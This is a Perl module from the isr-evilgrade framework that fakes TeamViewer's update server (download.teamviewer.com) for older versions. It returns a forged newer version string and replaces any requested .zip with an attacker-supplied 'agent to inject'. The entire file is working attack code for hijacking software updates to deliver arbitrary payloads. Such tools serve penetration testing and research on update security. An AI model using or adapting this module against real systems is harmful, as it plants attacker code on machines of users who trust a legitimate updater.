###############
# teamviewer.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::teamviewer;

use strict;
use Data::Dump qw(dump);

my $base = {
    'name'    => 'teamviewer',
    'version' => '1.0',
    'appver'  => '< 5.1.9385',
    'author'  => ['German Rodriguez < grodriguez +[AT]+ faradaysec.com >'],
    'description' => qq{TeamViewer},
    'vh'          => 'download.teamviewer.com',
    'request'     => [
        {   'req'  => '/download/update/TVversion', #regex friendly
            'type' => 'string',                     #file|string|agent|install
            'method' => '',                         #any
            'bin'    => '0',
            'string' => "6.0.32",
            'parse'  => '1',
            'file'   => '',
        },
        {   'req'    => '.zip',                     #regex friendly
            'type'   => 'agent',                    #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 1,
            'string' => '',
            'parse'  => '0',
            'file'   => ''
        },
    ],

    #Options
    'options' => {
        'agent' =>
            { 'val' => './agent/agent.zip', 'desc' => 'Agent to inject' },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'rnd1' => {
            'val'     => 'isrcore::utils::RndNum(2)',
            'hidden'  => 1,
            'dynamic' => 1,
        },
        'rnd2' => {
            'val'    => 'isrcore::utils::RndAlpha(isrcore::utils::RndNum(1))',
            'hidden' => 1,
            'dynamic' => 1,
        },

    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
